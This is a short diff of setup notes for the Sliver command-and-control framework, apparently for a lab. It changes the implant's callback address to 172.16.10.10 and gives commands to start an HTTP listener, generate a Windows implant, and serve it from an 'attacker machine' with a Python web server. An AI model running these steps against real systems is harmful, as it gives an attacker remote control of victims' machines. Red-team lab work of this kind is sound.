@@ -15,7 +15,7 @@ sudo /root/sliver-server operator --name mcp-operator --lhost 127.0.0.1 --save /
 start sliver server: sliver
 
 http --lhost 0.0.0.0 --lport 80
-generate --http <10.1.1.10>:80 --os windows --arch amd64 --skip-symbols --save ./implant.exe
+generate --http 172.16.10.10:80 --os windows --arch amd64 --skip-symbols --save ./implant.exe
 
 Run implant.exe on the Windows machine with
 1. On Attacker machine at file path of implant.exe: python3 -m http.server 8080
